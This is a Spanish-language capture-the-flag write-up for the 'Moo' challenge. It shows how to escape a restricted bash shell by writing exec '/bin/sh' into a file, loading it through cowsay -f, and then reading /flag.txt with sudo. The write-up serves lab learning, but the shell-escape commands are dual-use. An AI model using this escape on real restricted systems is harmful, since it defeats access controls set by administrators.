# Moo

## Enunciado del Reto
>~~~
>Just read the flag, it's all there.
>~~~

## Archivos

- Ninguno

- - -

## Solución

Tras conectarnos por ssh a la máquina. Somos recibidos con el siguiente mensaje de cowsay:

>~~~
> ______________________________________________________
>/ Welcome dear CTF player! You can read the flag with: \
>\ /bin/sudo /bin/cat /flag.txt. Or can you?...         /
> ------------------------------------------------------
>        \   ^__^
>         \  (oo)\_______
>            (__)\       )\/\
>                ||----w |
>                ||     ||
>user@moo:~$
>~~~

Intentamos hacer lo que dice y accedemos al fichero.

>~~~
>user@moo:~$ /bin/sudo /bin/cat /flag.txt
>bash: /bin/sudo: restricted: cannot specify `/' in command names
>~~~

Esto puede significar que nos encontramos en una [*Restricted Shell*](https://en.wikipedia.org/wiki/Restricted_shell). Para comprobarlo podemos ver que shell estamos ejectuando.

>~~~
>user@moo:~$ echo $SHELL
>/usr/local/rbin/rbash
>~~~

Efectivamente nos encontramos en una shell restringida. No podremos usar redirecciones `> >> 2> <`, pipes `|` ni especificar comandos con `/`, además de contar con un conjunto reducido de binarios para ejecutar.

Pulsando TAB dos veces podremos listar los comandos que tenemos disponibles.

>~~~
>user@moo:~$
>!          compgen    enable     history    read       true
>./         complete   esac       if         readarray  type
>:          compopt    eval       in         readonly   typeset
>[          continue   exec       jobs       return     ulimit
>[[         coproc     exit       kill       select     umask
>]]         cowsay     export     let        set        unalias
>alias      declare    false      local      shift      unset
>bg         dircolors  fc         logout     shopt      until
>bind       dirs       fg         ls         source     vim
>break      disown     fi         mapfile    suspend    wait
>builtin    do         for        popd       test       while
>caller     done       function   printf     then       {
>case       echo       getopts    pushd      time       }
>cd         elif       hash       pwd        times
>command    else       help       rbash      trap
>~~~

Podriamos ejecutar una shell desde `vim`, pero seguramente se trate de `rvim`, una versión restringida de vim. Algo que resulta raro es que en una shell restringida podamos usar `cowsay`. Este programa sirve para formatear texto de manera que parezca que una vaca lo está diciendo (igual que el mensaje de bienvenida de la máquina).

Cowsay está escrito en perl, y tiene una vulnerabilidad conocida que nos permite ejecutar código sin restricciones en una rshell. Lo haremos de la siguiente manera:

Primero crearemos con vim un fichero cuyo contenido sea `exec "/bin/sh"`, lo llamamos de cualquier manera, en este caso `tst`.

Luego creamos una variable que almacene la ruta al fichero:

>~~~
>user@moo:~$ AUX="/home/user/tst"
>user@moo:~$ echo $AUX
>/home/user/tst
>~~~

Finalmente, usamos `cowsay` para ejecutar una shell y probar con el comando que decía la vaca del principio.

>~~~
>user@moo:~$ cowsay -f $AUX x
>$ /bin/sudo /bin/cat /flag.txt
>Hero{s0m3_s4cr3d_c0w}
>~~~

## Flag

```
Hero{s0m3_s4cr3d_c0w}
```

>~~~
> _______________________
>< Hero{s0m3_s4cr3d_c0w} >
> -----------------------
>        \   ^__^
>         \  (xx)\_______
>            (__)\       )\/\
>             U  ||----w |
>                ||     ||
>~~~